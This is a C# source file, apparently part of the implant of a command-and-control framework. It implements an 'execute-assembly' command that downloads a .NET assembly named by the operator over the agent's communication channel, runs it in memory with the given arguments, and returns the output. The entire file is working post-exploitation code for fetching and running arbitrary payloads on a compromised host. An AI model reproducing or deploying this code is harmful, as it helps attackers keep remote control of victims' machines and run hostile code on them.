using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ExecuteAssemblyCommand : AgentCommand
    {
        public override string Name => "execute-assembly";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (task.SplittedArgs.Length == 0)
            {
                result.Result = "Please specify the name of the assembly to download & execute!";
                return;
            }

            var fileName = task.SplittedArgs[0];
            var fileContent = commm.Download(fileName, a =>
            {
                result.Completion = a;
                commm.SendResult(result);
                }).Result;

            var args = task.SplittedArgs.ToList();
            args.RemoveAt(0); //filename
            var output = Executor.ExecuteAssembly(fileContent, args.ToArray());

            result.Result = output;
        }
    }
}
